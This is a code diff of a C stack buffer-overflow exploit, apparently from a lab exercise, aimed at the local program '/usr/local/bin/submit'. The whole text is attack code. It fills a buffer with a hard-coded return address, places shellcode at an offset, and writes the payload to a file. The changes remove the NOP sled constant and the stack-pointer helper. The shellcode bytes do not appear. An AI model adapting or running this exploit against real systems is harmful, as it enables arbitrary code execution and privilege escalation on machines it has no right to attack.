@@ -9,20 +9,13 @@
 
 #define TARGET "/usr/local/bin/submit"
 
-#define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE            1024
-#define NOP                            0x90
-
-unsigned long get_sp(void) {
-   __asm__("movl %esp,%eax");
-}
 
 int main(void)
 {
   char *args[4];
 
-  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-  char *buff[bsize], *ptr;
+  char *buff[DEFAULT_BUFFER_SIZE], *ptr;
   long *addr_ptr;
   int i;
   long *addr = (long*)  0xffbfde0c; // Address of where shellcode starts
@@ -33,7 +26,7 @@ int main(void)
 
   //Fill buff with address
   //Addition addrs to overflow buffer
-  for (i = 0; i < bsize + 64; i+=4)
+  for (i = 0; i < DEFAULT_BUFFER_SIZE + 64; i+=4)
     *(addr_ptr++) = (long) addr;
 
   //Add shellcode to buffer with offset of 245
@@ -43,7 +36,7 @@ int main(void)
   for (i = 0; i < strlen(shellcode); i++){
     *(ptr++) = shellcode[i];
   }
-  buff[bsize - 1] = '\0';
+  buff[DEFAULT_BUFFER_SIZE - 1] = '\0';
 
   if ((payload_file = fopen("shellcode", "w+")) == NULL) {
     puts("Cannot open 'shellcode'");
